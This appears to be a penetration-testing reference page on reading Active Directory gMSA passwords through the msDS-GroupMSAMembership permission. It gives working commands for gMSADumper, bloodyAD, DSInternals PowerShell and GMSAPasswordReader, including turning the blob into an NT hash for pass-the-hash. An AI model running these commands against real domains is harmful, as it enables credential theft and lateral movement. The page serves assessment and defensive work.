This abuse stands out a bit from other abuse cases. It can be carried out when controlling an object that has enough permissions listed in the target gMSA account's msDS-GroupMSAMembership attribute's DACL. Usually, these objects are principals that were configured to be explictly allowed to use the gMSA account.

The attacker can then read the gMSA (group managed service accounts) password of the account if those requirements are met.
=== "UNIX-like"
    On UNIX-like systems, [gMSADumper](https://github.com/micahvandeusen/gMSADumper) (Python) can be used to read and decode gMSA passwords. It supports cleartext NTLM, pass-the-hash and Kerberoas authentications
    ```bash
    gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
    ```
    Or an alternative is bloodyAD
    ```bash
    bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object $TargetObject --attr msDS-ManagedPassword
    ```
=== "Windows"
    uses the Active Directory and DSInternals PowerShell modules.
    ```bash
    # Save the blob to a variable
    $gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
    $mp = $gmsa.'msDS-ManagedPassword'

    # Decode the data structure using the DSInternals module
    ConvertFrom-ADManagedPasswordBlob $mp
    # Build a NT-Hash for PTH
    (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
    # Alterantive: build a Credential-Object with the Plain Password
    $cred = new-object system.management.automation.PSCredential "Domain\Target_Account",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
    ```
    The second one relies on [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) (C#).
    ```bash
    .\GMSAPasswordReader.exe --AccountName 'Target_Account'
    ```